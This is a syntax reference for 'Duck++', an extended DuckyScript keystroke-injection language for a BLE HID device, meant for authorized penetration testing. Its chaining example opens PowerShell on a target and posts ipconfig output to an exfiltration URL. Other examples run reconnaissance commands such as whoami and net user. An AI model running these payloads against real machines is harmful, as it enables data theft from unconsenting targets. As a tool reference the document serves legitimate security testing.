# DuckyScript 2.0 (Duck++) – Syntax Reference

> **HackOS Phase 19** – Enhanced DuckyScript interpreter with logic, variables,
> and multi-payload chaining for authorized penetration testing.

---

## Table of Contents

1. [Overview](#overview)
2. [Standard Commands](#standard-commands)
3. [Extended Commands (Duck++)](#extended-commands-duck)
   - [REPEAT](#repeat)
   - [WAIT_FOR_BUTTON](#wait_for_button)
   - [IF_CONNECTED / END_IF](#if_connected--end_if)
   - [VAR](#var)
   - [Variable Injection](#variable-injection)
   - [CHAIN](#chain)
4. [Built-in Variables](#built-in-variables)
5. [Multi-Payload Chaining](#multi-payload-chaining)
6. [Example Scripts](#example-scripts)
7. [File Format](#file-format)

---

## Overview

Duck++ extends the standard DuckyScript language with logic, variables, and
multi-payload support.  Scripts are plain-text `.txt` files stored in
`/ext/badbt/` on the SD card and executed over BLE HID by the BadBT app.

All standard DuckyScript commands are fully supported.  The new commands
integrate seamlessly and can be mixed with existing ones.

---

## Standard Commands

| Command | Description | Example |
|---------|-------------|---------|
| `STRING <text>` | Type text character-by-character | `STRING Hello World` |
| `DELAY <ms>` | Pause for specified milliseconds | `DELAY 500` |
| `ENTER` / `RETURN` | Press Enter key | `ENTER` |
| `TAB` | Press Tab key | `TAB` |
| `ESC` / `ESCAPE` | Press Escape key | `ESC` |
| `GUI <key>` / `WINDOWS <key>` | GUI modifier + key | `GUI R` |
| `CTRL <key>` / `CONTROL <key>` | Ctrl modifier + key | `CTRL C` |
| `ALT <key>` | Alt modifier + key | `ALT F4` |
| `SHIFT <key>` | Shift modifier + key | `SHIFT TAB` |
| `CTRL-ALT <key>` | Ctrl+Alt combo + key | `CTRL-ALT DELETE` |
| `CTRL-SHIFT <key>` | Ctrl+Shift combo + key | `CTRL-SHIFT ESC` |
| `ALT-SHIFT <key>` | Alt+Shift combo + key | `ALT-SHIFT TAB` |
| `UP` / `UPARROW` | Arrow up | `UP` |
| `DOWN` / `DOWNARROW` | Arrow down | `DOWN` |
| `LEFT` / `LEFTARROW` | Arrow left | `LEFT` |
| `RIGHT` / `RIGHTARROW` | Arrow right | `RIGHT` |
| `DELETE` | Delete key | `DELETE` |
| `BACKSPACE` | Backspace key | `BACKSPACE` |
| `CAPSLOCK` | Caps Lock key | `CAPSLOCK` |
| `F1`–`F12` | Function keys | `F5` |
| `REM <comment>` | Comment (ignored) | `REM This is a comment` |

---

## Extended Commands (Duck++)

### REPEAT

Repeats the **previous line** a specified number of times.

```
REPEAT <count>
```

**Parameters:**
- `count` – Number of times to re-execute the previous line (default: 1).

**Example:**
```
STRING a
REPEAT 5
REM The letter 'a' is typed 6 times total (1 original + 5 repeats)
```

---

### WAIT_FOR_BUTTON

Pauses script execution until the user presses the joystick button on the
HackOS device.  Useful for interactive payloads that require manual triggers.

```
WAIT_FOR_BUTTON
```

**Example:**
```
STRING Step 1: Open a terminal
ENTER
WAIT_FOR_BUTTON
REM User presses the button when ready to proceed
STRING Step 2: Run the command
ENTER
```

The display shows `[WAIT_FOR_BUTTON]` while paused.

---

### IF_CONNECTED / END_IF

Conditional block that only executes if the BLE HID device is currently
connected (paired) with a target.  If not connected, all lines between
`IF_CONNECTED` and the matching `END_IF` are skipped.

```
IF_CONNECTED
  <commands executed only if BLE is connected>
END_IF
```

Blocks can be nested:

```
IF_CONNECTED
  STRING Connected!
  IF_CONNECTED
    STRING Still connected!
  END_IF
END_IF
```

**Example:**
```
IF_CONNECTED
  STRING Device is paired
  ENTER
END_IF
STRING This always runs
```

---

### VAR

Defines a user variable that can be referenced later using `$NAME` syntax in
`STRING` commands.  If the variable already exists, its value is overwritten.

```
VAR <name> <value>
```

**Parameters:**
- `name` – Variable name (alphanumeric + underscore, max 23 characters).
- `value` – Variable value (remaining text on the line, max 63 characters).

**Example:**
```
VAR TARGET_USER admin
VAR TARGET_PASS s3cur3_p4ss
STRING Username: $TARGET_USER
ENTER
STRING Password: $TARGET_PASS
ENTER
```

**Limits:**
- Maximum 8 user-defined variables per script execution.
- Names are case-sensitive.
- Variables persist across chained scripts (see [CHAIN](#chain)).

---

### Variable Injection

Any `$VARIABLE_NAME` token inside a `STRING` argument is expanded to the
variable's value at runtime.  This works for both built-in and user-defined
variables.

```
STRING Hello $DEVICE_NAME, UID is $LAST_NFC_UID
```

If a variable is undefined, the literal `$NAME` text is kept as-is.

Variable names must consist of `A-Z`, `a-z`, `0-9`, or `_`.  The name
terminates at the first character that is not in this set.

---

### CHAIN

Queues another script file to execute immediately after the current script
finishes.  The chained script is loaded from the same `/ext/badbt/` directory.

```
CHAIN <filename>
```

**Parameters:**
- `filename` – Name of the `.txt` script file to execute next.

**Behavior:**
- Only the **last** `CHAIN` command encountered during execution takes effect.
- User-defined variables are **preserved** across chained scripts.
- XP is awarded once the entire chain completes.
- The BLE connection is maintained between chained scripts.

**Example:**
```
REM phase1_recon.txt – reconnaissance script
CHAIN phase2_exploit.txt
GUI R
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING ipconfig /all
ENTER
REM After this script finishes, phase2_exploit.txt runs automatically
```

---

## Built-in Variables

These variables are always available and updated by the HackOS system:

| Variable | Description | Example Value |
|----------|-------------|---------------|
| `$DEVICE_NAME` | Current BLE stealth device name | `Apple Magic Keyboard` |
| `$LAST_NFC_UID` | Last NFC tag UID read by the NFC module | `04:A2:3B:FF:12:80:04` |
| `$WIFI_SSID` | Current WiFi SSID (from WiFi subsystem) | `HackOS-AP` |

**Note:** `$LAST_NFC_UID` and `$WIFI_SSID` show placeholder values if no data
has been captured yet by their respective modules.

---

## Multi-Payload Chaining

Duck++ supports chaining multiple scripts to build complex, multi-stage
attack sequences.  This enables combining different attack vectors:

### WiFi + HID Chain Example

**Script 1: `wifi_setup.txt`**
```
REM Stage 1: Set up WiFi exfiltration endpoint
CHAIN hid_payload.txt
VAR EXFIL_URL http://192.168.4.1/loot
STRING Setting up listener...
ENTER
WAIT_FOR_BUTTON
```

**Script 2: `hid_payload.txt`**
```
REM Stage 2: HID payload using data from Stage 1
GUI R
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "$EXFIL_URL" -Method POST -Body (ipconfig)
ENTER
```

Variables set in the first script are available in the chained script.

---

## Example Scripts

### Interactive Payload with Variable Injection

```
REM Duck++ demo – interactive payload with variables
VAR USER admin
VAR DOMAIN corp.local

REM Wait for the operator to confirm target is ready
WAIT_FOR_BUTTON

GUI R
DELAY 500
STRING cmd
ENTER
DELAY 1000

REM Type using injected variables
STRING net user $USER /domain:$DOMAIN
ENTER

REM Repeat the UP arrow 3 times to scroll through history
UP
REPEAT 3

IF_CONNECTED
  STRING echo "Still connected to $DEVICE_NAME"
  ENTER
END_IF
```

### Conditional Reconnection Script

```
REM Retry payload – only runs commands when BLE is active
IF_CONNECTED
  STRING echo "Connection confirmed"
  ENTER
  DELAY 500
  STRING whoami
  ENTER
END_IF
```

---

## File Format

- **Encoding:** Plain ASCII text (UTF-8 compatible).
- **Line endings:** Both `\n` (Unix) and `\r\n` (Windows) are supported.
- **Max script size:** 4096 bytes.
- **Max lines:** 128 parsed lines per script.
- **Max line length:** 255 characters.
- **File extension:** `.txt`
- **Storage location:** `/ext/badbt/` on the SD card.

---

## Legal Notice

> **WARNING:** Injecting keystrokes into devices you do not own or have
> explicit written authorization to test is **illegal**.  Duck++ is designed
> exclusively for authorized penetration testing and security research.
> Always obtain proper written consent before use.
